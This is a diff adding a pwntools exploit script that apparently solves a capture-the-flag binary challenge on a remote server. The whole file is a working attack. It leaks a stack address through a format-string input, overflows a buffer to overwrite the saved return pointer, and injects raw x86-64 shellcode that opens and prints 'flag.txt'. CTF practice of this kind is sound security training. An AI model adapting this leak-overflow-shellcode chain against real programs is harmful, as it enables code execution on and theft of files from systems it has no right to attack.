@@ -1,0 +1,28 @@
+from pwn import * # Import pwntools
+
+p = remote('all.chal.cyberjousting.com', 1348)
+# p = process("./all") # start the vuln binary
+
+# __import__('time').sleep(30)
+
+context.log_level = 'debug'
+
+p.sendline("%10$p")
+leak = int(p.recvline().strip(), 0)
+
+print(hex(leak))
+
+leak -= 8*2
+
+print(hex(leak))
+
+read_flag_payload = b"\x48\x31\xc0\xb0\x02\x48\x8d\x3d\x28\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x96\xb8\x28\x00\x00\x00\xbf\x01\x00\x00\x00\x41\xba\x00\x10\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05\x00\x00\x66\x6c\x61\x67\x2e\x74\x78\x74\x00"
+
+pre_payload = b"quit\x00\x00\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" # these dont have to be a nop slide I just wanted to
+clobber_srip_payload = p64(leak)
+
+payload = pre_payload + clobber_srip_payload + read_flag_payload
+
+p.sendline(payload)
+print(p.recvline())
+# print(p.recvline())
